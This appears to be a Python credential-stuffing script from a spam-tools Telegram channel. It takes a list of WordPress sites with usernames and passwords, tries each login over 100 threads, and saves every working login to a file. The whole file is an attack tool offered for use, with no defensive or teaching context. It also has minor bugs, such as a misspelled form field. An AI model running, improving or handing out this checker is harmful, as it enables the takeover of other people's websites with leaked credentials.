from multiprocessing.dummy import Pool as ThreadPool
from requests import request
from colorama import *

headers = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def check(url):
    #site, user, passwd = url.split("|")
    site = url.split("|")[0]
    user, passwd = url.split("|")[1].split(":")
    try:
        resp = request(method='POST',url=site,headers=headers, data={
            'log':user,
            'pwd': passwd,
            'wp-sumbit': 'Log In'
        },timeout=5).text
    except:
        pass

    if 'Dashboard' in resp:
        print(Fore.GREEN + "[Success] --> " + site)
        open("wp-login.txt", "a").write(site+"#"+user+"@"+passwd+"\n")
    else:
        print(Fore.RED + "[Failed] --> "+ site)

print("""
WordPress Login Checker Coded By Full Crypt
Join My Channel https://t.me/fullcryptspamtools
""")

def loadlist():
    try:
        load = input("Enter a List: ")
        try:
            with open(load, 'r') as (get):
                read = get.read().splitlines()
        except IOError:
            pass
        read = list(read)
        try:
            pp = ThreadPool(100)
            pr = pp.map(check, read)
        except:
            pass
    except:
        pass
loadlist()